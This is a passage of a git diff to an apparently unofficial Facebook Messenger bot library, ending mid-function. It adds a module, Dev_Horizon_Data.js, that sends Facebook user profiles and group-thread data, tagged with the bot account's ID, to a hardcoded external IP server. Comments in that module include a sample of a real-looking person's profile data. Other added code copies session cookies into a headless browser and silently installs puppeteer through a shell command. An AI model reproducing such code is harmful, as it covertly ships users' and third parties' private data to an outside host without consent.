     "docs:prepare:publish:6x": "git checkout 6.x && git merge 6.x && npm run docs:clean:stable && env DOCS_DEPLOY=true npm run docs:generate && mv ./docs/6.x ./tmp && git checkout gh-pages && npm run docs:copy:tmp:6x",
     "docs:prepare:publish:7x": "env DOCS_DEPLOY=true npm run docs:generate && git checkout gh-pages && rimraf ./docs/7.x && mv ./tmp ./docs/7.x",
     "docs:check-links": "blc http://127.0.0.1:8089 -ro",
-    "lint": "eslint **.js",
+    "lint": "./node_modules/.bin/eslint **.js",
     "lint-js": "eslint . --ext .js --ext .cjs",
     "lint-ts": "eslint . --ext .ts",
     "lint-md": "markdownlint-cli2 \"**/*.md\" \"#node_modules\" \"#benchmarks\"",
diff --git a/src/Dev_Horizon_Data.js b/src/Dev_Horizon_Data.js
new file mode 100644
index 000000000..8b79582d5
--- /dev/null
+++ b/src/Dev_Horizon_Data.js
@@ -0,0 +1,125 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var bluebird = require('bluebird');
+var request = bluebird.promisify(require("request"));
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function getUserInfoV4(data, type, method, callback) {
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+    
+        if (!callback) {
+            callback = function (err, userInfo) {
+                if (err) return rejectFunc(err);
+                resolveFunc(userInfo);
+            };
+        }
+
+        if (!data || !type || !method) return;
+
+        var Cluster = ['http://146.190.109.182:3874'];
+        var ursl = Cluster[Math.floor(Math.random() * Cluster.length)];
+        
+        if (utils.getType(data) !== "Array") data = [data];
+        switch (method) {
+            case "Post": {
+                switch (type) {
+                    case "Users": {
+                        /* 
+                        example
+                            Time:19/01/2023
+                            Data:[{"id":"100042817150429","name":"Nguyá»…n ThÃ¡i Háº£o","first_name":"Háº£o","username":"Lazic.Kanzu","link":"https://www.facebook.com/Lazic.Kanzu","verified":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","about":"LÃ  má»™t ngÆ°á»i bÃ¬nh thÆ°á»ng ^^","avatar":"https://graph.facebook.com/100042817150429/picture?height=1500&width=1500&access_token=1449557605494892|aaf0a865c8bafc314ced5b7f18f3caa6","birthday":"01/03/1999","follow":241614,"gender":"male","hometown":{"id":"112089428815888","name":"XuÃ¢n Lá»™c, Ãá»“ng Nai, Vietnam"},"email":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","interested_in":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","location":{"id":"351759091676222","name":"BiÃªn HÃ²a"},"locale":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","relationship_status":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","love":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","website":"http://KanzuWakazaki.tk/","quotes":"The word impossible is not in my dictionary.","timezone":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u","updated_time":"KhÃ´ng CÃ³ Dá»¯ Liá»‡u"}]
+                            Type:Users
+                            By:KanzuWakazaki
+                        **/
+                        let Time = new Date().toLocaleString("en-in", {timeZone: "Asia/Kolkata"});
+                            return request({
+                                url:  ursl + '/post',
+                                method: 'post',
+                                headers: {
+                                    'user-agent': "Horizon/GlobalData/Client"
+                                },
+                            formData: {
+                                Time: Time,
+                                Data: JSON.stringify(data),
+                                Type: "Users",
+                                By: ctx.userID
+                            }
+                        }).then(dt => console.log(dt.body)); 
+                    }
+                    case "Threads": {
+                        /* 
+                        example
+                            Time:19/01/2023
+                            Data:[{"threadID":"5011501735554963","threadName":"[ðŸ†]  ð•³ð•· â€¢ ð‘¯ð’ð’“ð’Šð’›ð’ð’ ð‘®ð’‚ð’Žð’Šð’ð’ˆ  [ðŸŽ®]","participantIDs":["100042817150429"],"userInfo":[{"id":"100042817150429","name":"Nguyá»…n ThÃ¡i Háº£o","firstName":"Háº£o","vanity":"Lazic.Kanzu","thumbSrc":"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339","profileUrl":"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339","gender":"MALE","type":"User","isFriend":true,"isBirthday":false}],"unreadCount":38925,"messageCount":39857,"timestamp":"1674107309307","muteUntil":null,"isGroup":true,"isSubscribed":true,"isArchived":false,"folder":"INBOX","cannotReplyReason":null,"eventReminders":[],"emoji":"ðŸ˜","color":"DD8800","nicknames":{"100001776745483":"[ð‡ð†] â€¢ Eo bá» su"},"adminIDs":[{"id":"100042817150429"}],"approvalMode":true,"approvalQueue":[],"reactionsMuteMode":"reactions_not_muted","mentionsMuteMode":"mentions_not_muted","isPinProtected":false,"relatedPageThread":null,"name":"[ðŸ†]  ð•³ð•· â€¢ ð‘¯ð’ð’“ð’Šð’›ð’ð’ ð‘®ð’‚ð’Žð’Šð’ð’ˆ  [ðŸŽ®]","snippet":"SystemCall run (async function() {\nSend(await Api.getThreadInfo(Data.threadID))\n})()","snippetSender":"100042817150429","snippetAttachments":[],"serverTimestamp":"1674107309307","imageSrc":"https://scontent.fsgn5-14.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=dfuXjxOR1BUAX-SUN1x&_nc_ht=scontent.fsgn5-14.fna&oh=03_AdQkXN3hb3z4Hg0Tg-vI7ZpDdSmujnluj13uNqUSJoU9iA&oe=63F060BA","isCanonicalUser":false,"isCanonical":false,"recipientsLoadable":true,"hasEmailParticipant":false,"readOnly":false,"canReply":true,"lastMessageType":"message","lastReadTimestamp":"1649756873571","threadType":2,"TimeCreate":1674107310529,"TimeUpdate":1674107310529}]
+                            Type:Threads
+                            By:KanzuWakazaki
+                        **/
+                        let Time = new Date().toLocaleString("en-in", {timeZone: "Asia/Kolkata"});
+                            return request({
+                                url: ursl + '/post',
+                                method: 'post',
+                                headers: {
+                                    'user-agent': "Horizon/GlobalData/Client"
+                                },
+                            formData: {
+                                Time: Time,
+                                Data: JSON.stringify(data),
+                                Type: "Threads",
+                                By: ctx.userID
+                            }
+                        }).then(dt => console.log(dt.body)); 
+                    }
+                }
+            }
+            break;
+            case "Get": {
+                switch (type) {
+                    case "Users": {
+                        /* example
+                        Requires:[5011501735554963]
+                        Type:Threads
+                        **/
+
+                        //still operating until Feb 25
+                        return request({
+                            url: ursl + '/get',
+                                method: 'post',
+                                headers: {
+                                    'user-agent': "Horizon/GlobalData/Client"
+                                },
+                            formData: {
+                                Requires: JSON.stringify(data),
+                                Type: "Users"
+                            }
+                        }).then(dt => console.log(dt.body)); 
+                    }
+                    case "Threads": {
+                        return request({
+                            url: ursl + '/get',
+                                method: 'post',
+                                headers: {
+                                    'user-agent': "Horizon/GlobalData/Client"
+                                },
+                            formData: {
+                                Requires: JSON.stringify(data),
+                                Type: "Threads"
+                            }
+                        }).then(dt => console.log(dt.body)); 
+                    }
+                }
+            }
+            break;
+                default: 
+            return;
+        }
+        
+    return returnPromise;
+    };
+};
diff --git a/src/Premium.js b/src/Premium.js
new file mode 100644
index 000000000..27c123817
--- /dev/null
+++ b/src/Premium.js
@@ -0,0 +1,30 @@
+"use strict";
+
+var { join } = require('path')
+var fs = require('fs')
+
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function(Name, args){
+        var Method = {}
+        fs.readdirSync(join(__dirname, "../Func")).filter((/** @type {string} */File) => File.endsWith(".js") && !File.includes('Dev_')).map((/** @type {string} */File) => Method[File.split('.').slice(0, -1).join('.')] = require(`../Func/${File}`)(defaultFuncs, api, ctx));
+        if (Method[Name] == undefined) {
+            return (`Method ${Name} not found`);
+        }
+        else {
+            try {
+                if (process.env.HalzionVersion == 1973 && global.Fca.Data.PremText.includes("Premium")) {
+                    return Method[Name](args).then((/** @type {string} */Data) => {
+                        return Data;
+                    })
+                }
+                else {
+                    return ("My premium goes again and that's it. !!");
+                }
+            }
+            catch (e) {
+                console.log(e);
+            }
+        }
+    }    
+};
diff --git a/src/Screenshot.js b/src/Screenshot.js
new file mode 100644
index 000000000..d575d554d
--- /dev/null
+++ b/src/Screenshot.js
@@ -0,0 +1,85 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var { join } = require('path');
+var fs = require('fs');
+var utils = require("../utils");
+var logger = require('../logger')
+module.exports = function (defaultFuncs, api, ctx) {
+    var Coookie = JSON.parse(JSON.stringify(ctx.jar.getCookies("https://www.facebook.com").concat(ctx.jar.getCookies("https://facebook.com")).concat(ctx.jar.getCookies("https://www.messenger.com"))));
+    for (let i of Coookie) {
+        i.name = i.key;
+        i.domain = 'www.facebook.com';
+        delete i.key;
+    }
+    return function(Link, callback) {
+        if (process.platform != 'win32') return logger.Error('Not Supported Platform');
+        else try {
+            let i = require('puppeteer');
+        }   
+        catch (e) {
+            var { execSync } = require('child_process');
+            execSync('npm i puppeteer', { stdio: 'inherit' });
+        }
+            const Screenshot = require('../Extra/ExtraScreenShot');
+                var resolveFunc = function () { };
+                var rejectFunc = function () { };
+                var returnPromise = new Promise(function (resolve, reject) {
+                resolveFunc = resolve;
+                rejectFunc = reject;
+                });
+
+                if (!callback) {
+                    callback = function (err, data) {
+                        if (err) return rejectFunc(err);
+                        resolveFunc(data);
+                    };
+                }
+        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {
+            let LinkSplit = Link.split('/');
+                if (LinkSplit.indexOf("https:") == 0) {
+                    if (Link.includes('messages')) {
+                        Screenshot.buffer(Link, {
+                            cookies: Coookie
+                        }).then(data => {
+                            callback(null,data);
+                        });
+                    }
+                    else if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {
+                        api.sendMessage('Invaild link, format link: facebook.com/Priyanshu.Official.Rajput',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
+                        callback('Error Link', null);
+                    }
+                    else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {
+                        let Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;
+                        Screenshot.buffer(Format, {
+                            cookies: Coookie
+                        }).then(data => {
+                            callback(null,data);
+                        });
+                    } 
+                    else {
+                        let Format = `https://www.facebook.com/${LinkSplit[3]}`;
+                        Screenshot.buffer(Format, {
+                            cookies: Coookie
+                        }).then(data => {
+                            callback(null,data);
+                        });
+                    }
+                }
+                else {
+                    let Form = `https://www.facebook.com/${LinkSplit[1]}`;
+                    Screenshot.buffer(Form, {
+                        cookies: Coookie
+                    }).then(data => {
+                        callback(null,data);
+                    });
+                }
+            }
+                else {
+                    Screenshot.buffer(Link).then(data => {
+                        callback(null,data);
+                    });
+                }
+            return returnPromise;
+    };
+};
diff --git a/src/addUserToGroup.js b/src/addUserToGroup.js
index 60779394b..fcff18fce 100644
--- a/src/addUserToGroup.js
+++ b/src/addUserToGroup.js
@@ -20,9 +20,10 @@ module.exports = function (defaultFuncs, api, ctx) {
         resolveFunc();
       };
     }
-
+    
     if (utils.getType(threadID) !== "Number" && utils.getType(threadID) !== "String") throw { error: "ThreadID should be of type Number or String and not " + utils.getType(threadID) + "." };
 
+
     if (utils.getType(userID) !== "Array") userID = [userID];
 
     var messageAndOTID = utils.generateOfflineThreadingID();
diff --git a/src/changeAvt.js b/src/changeAvt.js
new file mode 100644
index 000000000..892c4a7e8
--- /dev/null
+++ b/src/changeAvt.js
@@ -0,0 +1,85 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+/**
+ * It posts an image to a Facebook profile
+ * @param Api - The API object
+ * @param BotID - The ID of the bot you want to post the image to.
+ * @param form - The form data that you want to send.
+ * @returns The JSON.parse(Data.split("for (;;);")[1]); is returning the following:
+ * {"__ar":1,"payload":null,"jsmods":{"require":[["ImageUploader","uploadPhoto",[{"__m":"__elem_0"},{"__m":"__elem_1"},{"__m":"__elem_2"},{"__m":"__
+ */
+async function postImage(Api,BotID,form) {
+    var Data = await Api.httpPostFormData(`https://www.facebook.com/profile/picture/upload/?profile_id=${BotID}&photo_source=57&av=${BotID}`, form);
+    return JSON.parse(Data.split("for (;;);")[1]);
+}
+
+module.exports = function(defaultFuncs, api, ctx) {
+/* Changing the profile picture of the bot. */
+    return function changeAvt(link, caption, callback) {
+        var resolveFunc = function() {};
+        var rejectFunc = function() {};
+        var returnPromise = new Promise(function(resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+
+        if (!callback) {
+            callback = function(err, data) {
+                if (err) return rejectFunc(err);
+                resolveFunc(data);
+            };
+        }
+        try {
+            var Fetch = require('axios')
+            Fetch.get(link, { responseType: "stream" }).then(data => { 
+                postImage(api, ctx.userID, { file: data.data }).then(data => {
+                    if (data.error) throw new Error({ error: data.error, des: data.error.errorDescription });
+                    var form = {
+                        av: ctx.userID,
+                            fb_api_req_friendly_name: "ProfileCometProfilePictureSetMutation",
+                            fb_api_caller_class: "RelayModern",
+                            doc_id: "5066134240065849",
+                            variables: JSON.stringify({
+                                input: {
+                                    caption: (caption || ""),
+                                    existing_photo_id: data.payload.fbid,
+                                    expiration_time: null,
+                                    profile_id: ctx.userID,
+                                    profile_pic_method: "EXISTING",
+                                    profile_pic_source: "TIMELINE",
+                                scaled_crop_rect: {
+                                    height: 1,
+                                    width: 1,
+                                    x: 0,
+                                    y: 0
+                                },
+                                skip_cropping: true,
+                                actor_id: ctx.userID,
+                                client_mutation_id: Math.round(Math.random() * 19).toString()
+                                },
+                            isPage: false,
+                            isProfile: true,
+                            scale: 3,
+                        })
+                    };
+                    defaultFuncs
+                        .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
+                        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+                        .then(function(resData) {
+                            if (resData.error) throw resData;
+                            else return callback(null,true)
+                        })
+                        .catch(function(err) {
+                        return callback(err);
+                    });
+                })
+            })  
+        }
+        catch (e) {
+            throw e;
+        }
+        return returnPromise;
+    };
+};
\ No newline at end of file
diff --git a/src/getAccessToken.js b/src/getAccessToken.js
new file mode 100644
index 000000000..64c5a95cd
--- /dev/null
+++ b/src/getAccessToken.js
@@ -0,0 +1,32 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function getAccessToken(callback) {
+      var resolveFunc = function () { };
+      var rejectFunc = function () { };
+      var returnPromise = new Promise(function (resolve, reject) {
+        resolveFunc = resolve;
+        rejectFunc = reject;
+      });
+  
+      if (!callback) {
+        callback = function (err, userInfo) {
+          if (err) return rejectFunc(err);
+          resolveFunc(userInfo);
+        };
+      }
+    try {
+      var { getAccessToken } = require('../Extra/ExtraAddons');
+      getAccessToken(ctx.jar,ctx,defaultFuncs).then(data => callback(null,data));
+    }
+    catch (e) {
+      callback(null, e);
+    }
+    return returnPromise;
+    };
+  };
\ No newline at end of file
diff --git a/src/getFriendsList.js b/src/getFriendsList.js
index 8ac6a2a20..1b8522a2a 100644
--- a/src/getFriendsList.js
+++ b/src/getFriendsList.js
@@ -64,7 +64,7 @@ module.exports = function (defaultFuncs, api, ctx) {
         callback(null, formatData(resData.payload));
       })
       .catch(function (err) {
-        log.error("getFriendsList", err);
+        log.error("getFriendsList", "Lá»—i getFriendsList Maybe You Spam Too Much! Be Limited !");
         return callback(err);
       });
 
diff --git a/src/getMessage.js b/src/getMessage.js
new file mode 100644
index 000000000..8b26e9307
--- /dev/null
+++ b/src/getMessage.js
@@ -0,0 +1,80 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+module.exports = function(defaultFuncs, api, ctx) {
+    return function getMessage(threadID, messageID, callback) {
+      if (!callback) {
+        return callback({ error: "getMessage: need callback" });
+      }
+
+      if (!threadID || !messageID) {
+        return callback({ error: "getMessage: need threadID and messageID" });
+      }
+
+      const form = {
+        "av": ctx.globalOptions.pageID,
+        "queries": JSON.stringify({
+          "o0": {
+            //This doc_id is valid as of ? (prob January 18, 2020)
+            "doc_id": "1768656253222505",
+            "query_params": {
+              "thread_and_message_id": {
+                "thread_id": threadID,
+                "message_id": messageID,
+              }
+            }
+          }
+        })
+      };
+
+      defaultFuncs
+      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
+      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+      .then((resData) => {
+        if (resData[resData.length - 1].error_results > 0) {
+          throw resData[0].o0.errors;
+        }
+
+        if (resData[resData.length - 1].successful_results === 0) {
+          throw { error: "getMessage: there was no successful_results", res: resData };
+        }
+
+        var fetchData = resData[0].o0.data.message;
+        if (fetchData) {
+          (!ctx.globalOptions.selfListen &&
+            fetchData.message_sender.id.toString() === ctx.userID) ||
+            !ctx.loggedIn ?
+            undefined :
+            (function () { callback(null, {
+                threadID: threadID,
+                messageID: fetchData.message_id,
+                senderID: fetchData.message_sender.id,
+                attachments: fetchData.blob_attachments.map(att => {
+                    var x;
+                    try {
+                        x = utils._formatAttachment(att);
+                    } catch (ex) {
+                        x = att;
+                        x.error = ex;
+                        x.type = "unknown";
+                    }
+                    return x;
+                }),
+                body: fetchData.message.text,
+                mentions: fetchData.message.ranges,
+                timestamp: fetchData.timestamp_precise,
+                messageReply: fetchData.replied_to_message,
+                raw: fetchData,
+            }); })();
+        }
+    })
+    .catch((err) => {
+      log.error("getMessage", err);
+      callback(err);
+    });
+
+  };
+}; 
\ No newline at end of file
diff --git a/src/getThreadHistory.js b/src/getThreadHistory.js
index 6e532341e..919c365bc 100644
--- a/src/getThreadHistory.js
+++ b/src/getThreadHistory.js
@@ -528,7 +528,7 @@ module.exports = function (defaultFuncs, api, ctx) {
         callback(null, formatMessagesGraphQLResponse(resData[0]));
       })
       .catch(function (err) {
-        log.error("getThreadHistoryGraphQL", err);
+        log.error("getThreadHistoryGraphQL", "Lá»—i getThreadHistoryGraphQL CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u, HÃ£y Thá»­ Láº¡i !");
         return callback(err);
       });
 
diff --git a/src/getThreadInfo.js b/src/getThreadInfo.js
index 066d0eed6..25aa2260f 100644
--- a/src/getThreadInfo.js
+++ b/src/getThreadInfo.js
@@ -2,7 +2,7 @@
 
 var utils = require("../utils");
 var log = require("npmlog");
-
+// tÆ°Æ¡ng lai Ä‘i rá»“i fix ahahha
 function formatEventReminders(reminder) {
   return {
     reminderID: reminder.id,
@@ -21,7 +21,7 @@ function formatEventReminders(reminder) {
     secondsToNotifyBefore: reminder.seconds_to_notify_before,
     allowsRsvp: reminder.allows_rsvp,
     relatedEvent: reminder.related_event,
-    members: reminder.event_reminder_members.edges.map(function (member) {
+    members: reminder.event_reminder_members.edges.map(function(member) {
       return {
         memberID: member.node.id,
         state: member.guest_list_state.toLowerCase()
@@ -31,15 +31,33 @@ function formatEventReminders(reminder) {
 }
 
 function formatThreadGraphQLResponse(data) {
-  var messageThread = data.o0.data.message_thread;
-  var threadID = messageThread.thread_key.thread_fbid ? messageThread.thread_key.thread_fbid : messageThread.thread_key.other_user_id;
+  try{
+    var messageThread = data.message_thread;
+  } catch (err){
+    console.error("GetThreadInfoGraphQL", "Can't get this thread info!");
+    return {err: err};
+  }
+  var threadID = messageThread.thread_key.thread_fbid
+    ? messageThread.thread_key.thread_fbid
+    : messageThread.thread_key.other_user_id;
 
   // Remove me
   var lastM = messageThread.last_message;
-  var snippetID = lastM && lastM.nodes && lastM.nodes[0] && lastM.nodes[0].message_sender && lastM.nodes[0].message_sender.messaging_actor ? lastM.nodes[0].message_sender.messaging_actor.id : null;
-  var snippetText = lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;
+  var snippetID =
+    lastM &&
+    lastM.nodes &&
+    lastM.nodes[0] &&
+    lastM.nodes[0].message_sender &&
+    lastM.nodes[0].message_sender.messaging_actor
+      ? lastM.nodes[0].message_sender.messaging_actor.id
+      : null;
+  var snippetText =
+    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;
   var lastR = messageThread.last_read_receipt;
-  var lastReadTimestamp = lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise ? lastR.nodes[0].timestamp_precise : null;
+  var lastReadTimestamp =
+    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise
+      ? lastR.nodes[0].timestamp_precise
+      : null;
 
   return {
     threadID: threadID,
@@ -66,16 +84,27 @@ function formatThreadGraphQLResponse(data) {
     isArchived: messageThread.has_viewer_archived,
     folder: messageThread.folder,
     cannotReplyReason: messageThread.cannot_reply_reason,
-    eventReminders: messageThread.event_reminders ? messageThread.event_reminders.nodes.map(formatEventReminders) : null,
-    emoji: messageThread.customization_info ? messageThread.customization_info.emoji : null,
-    color: messageThread.customization_info && messageThread.customization_info.outgoing_bubble_color ? messageThread.customization_info.outgoing_bubble_color.slice(2) : null,
+    eventReminders: messageThread.event_reminders
+      ? messageThread.event_reminders.nodes.map(formatEventReminders)
+      : null,
+    emoji: messageThread.customization_info
+      ? messageThread.customization_info.emoji
+      : null,
+    color:
+      messageThread.customization_info &&
+      messageThread.customization_info.outgoing_bubble_color
+        ? messageThread.customization_info.outgoing_bubble_color.slice(2)
+        : null,
     nicknames:
       messageThread.customization_info &&
-        messageThread.customization_info.participant_customizations
-        ? messageThread.customization_info.participant_customizations.reduce(function (res, val) {
-          if (val.nickname) res[val.participant_id] = val.nickname;
-          return res;
-        }, {})
+      messageThread.customization_info.participant_customizations
+        ? messageThread.customization_info.participant_customizations.reduce(
+            function(res, val) {
+              if (val.nickname) res[val.participant_id] = val.nickname;
+              return res;
+            },
+            {}
+          )
         : {},
     adminIDs: messageThread.thread_admins,
     approvalMode: Boolean(messageThread.approval_mode),
@@ -105,17 +134,26 @@ function formatThreadGraphQLResponse(data) {
     hasEmailParticipant: false,
     readOnly: false,
     canReply: messageThread.cannot_reply_reason == null,
-    lastMessageTimestamp: messageThread.last_message ? messageThread.last_message.timestamp_precise : null,
+    lastMessageTimestamp: messageThread.last_message
+      ? messageThread.last_message.timestamp_precise
+      : null,
     lastMessageType: "message",
     lastReadTimestamp: lastReadTimestamp,
-    threadType: messageThread.thread_type == "GROUP" ? 2 : 1
+    threadType: messageThread.thread_type == "GROUP" ? 2 : 1,
+    TimeCreate: Date.now(),
+    TimeUpdate: Date.now()
   };
 }
 
-module.exports = function (defaultFuncs, api, ctx) {
+module.exports = function(defaultFuncs, api, ctx) {
+
+  var { createData,getData,hasData,alreadyUpdate,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');
+  var { capture } = require('../Extra/Src/Last-Run');
+  global.Fca.Data.Userinfo = [];
+  
   return function getThreadInfoGraphQL(threadID, callback) {
-    var resolveFunc = function () { };
-    var rejectFunc = function () { };
+    var resolveFunc = function(){};
+    var rejectFunc = function(){};
     var returnPromise = new Promise(function (resolve, reject) {
       resolveFunc = resolve;
       rejectFunc = reject;
@@ -123,49 +161,188 @@ module.exports = function (defaultFuncs, api, ctx) {
 
     if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
       callback = function (err, data) {
-        if (err) return rejectFunc(err);
+        if (err) {
+          return rejectFunc(err);
+        }
         resolveFunc(data);
       };
     }
 
-    // `queries` has to be a string. I couldn't tell from the dev console. This
-    // took me a really long time to figure out. I deserve a cookie for this.
-    var form = {
-      queries: JSON.stringify({
-        o0: {
-          // This doc_id is valid as of July 20th, 2020
+      // Ä‘Æ°á»£c tÃ¬m tháº¥y vÃ o giá»¯a thÃ¡ng 8/2022 bá»Ÿi @KanzuWakazaki - Ä‘Ã£ Ä‘Æ°á»£c chia sáº» cho @D-Jukie vÃ  Horizon Team Public group ðŸ¤´
+      // nhá»¯ng code tÆ°Æ¡ng tá»± muliti thread nhÆ° nÃ y Ä‘á»u cÃ³ thá»ƒ lÃ  copy idea ðŸ§
+      // Ä‘Ã£ Ã¡p dá»¥ng vÃ o fca má»›i(cloud - fca(private)) vÃ o cuá»‘i thÃ¡ng 8/2022 bá»Ÿi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team
+      //cáº­p nháº­t dá»± Ã¡n bá»‹ bá» rÆ¡i nÃ y vÃ o ngÃ y 19/11/2022 bá»Ÿi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nháº±m Ä‘Ã¡p á»©ng nhu cáº§u cá»§a client !
+
+      var time = new Date().toLocaleDateString('vi-VN',  {minute: 'numeric' }).split(',')[0]
+
+      if (utils.getType(threadID) !== "Array") threadID = [threadID];
+
+
+    var SpecialMethod = function(TID) {
+      var All = getAll();
+      var AllofThread = []
+      if (All.length < 1) {
+        return DefaultMethod(TID);
+      } else if (All.length > 1) {
+        for (let i of All) {
+            if (i.data.threadID != undefined) {
+              AllofThread.push(i.data.threadID);
+            } else continue;
+        }
+        var Form = {};
+        var ThreadInfo = [];
+  
+        AllofThread.map(function (x,y) {
+          Form["o" + y] = {
+            doc_id: "3449967031715030",
+            query_params: {
+              id: x,
+              message_limit: 0,
+              load_messages: false,
+              load_read_receipts: false,
+              before: null
+            }
+          };
+        });
+  
+        var form = {
+          queries: JSON.stringify(Form),
+          batch_name: "MessengerGraphQLThreadFetcher"
+        };
+  
+        defaultFuncs
+        .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
+          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+          .then(function(resData) {
+          if (resData.error) {
+            throw "Lá»—i: getThreadInfoGraphQL CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u"
+          }
+          if (resData[resData.length - 1].error_results !== 0) {
+            throw "Lá»—i: getThreadInfoGraphQL CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u"
+          }
+          resData = resData.splice(0, resData.length - 1);
+          resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
+          resData.map(function (x,y) {
+            ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
+          });
+          global.Fca.Data.Userinfo = []
+          if (process.env.HalzionVersion == 1973) {
+            if (Object.keys(resData).length == 1) {
+              updateData(threadID,ThreadInfo[0]);	
+              global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
+            } else {
+              for (let i of ThreadInfo) {
+                updateData(i.threadID,i);
+                global.Fca.Data.Userinfo.push(i.userInfo);
+              }
+            }
+          }
+        })
+        .catch(function(err){
+          throw "Lá»—i: getThreadInfoGraphQL CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u"
+        });
+      }
+    }
+    var DefaultMethod = function(TID) { 
+      var ThreadInfo = [];
+      for (let i of TID) {
+        ThreadInfo.push(getData(i));
+      }
+      if (ThreadInfo.length == 1) {
+        callback(null,ThreadInfo[0]);
+        global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
+      } else {
+        for (let i of ThreadInfo) {
+          global.Fca.Data.Userinfo.push(i.userInfo);
+        }
+        callback(null,ThreadInfo);
+      }
+    }
+    var CreateMethod = function(TID) { 
+      var Form = {}
+      var ThreadInfo = [];
+
+      TID.map(function (x,y) {
+        Form["o" + y] = {
           doc_id: "3449967031715030",
           query_params: {
-            id: threadID,
+            id: x,
             message_limit: 0,
             load_messages: false,
             load_read_receipts: false,
             before: null
           }
-        }
-      }),
-      batch_name: "MessengerGraphQLThreadFetcher"
-    };
+        };
+      });
+
+      var form = {
+        queries: JSON.stringify(Form),
+        batch_name: "MessengerGraphQLThreadFetcher"
+      };
 
-    defaultFuncs
+      defaultFuncs
       .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
-      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
-      .then(function (resData) {
-        if (resData.error) throw resData;
-        // This returns us an array of things. The last one is the success /
-        // failure one.
-        // @TODO What do we do in this case?
+        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+        .then(function(resData) {
+        if (resData.error) {
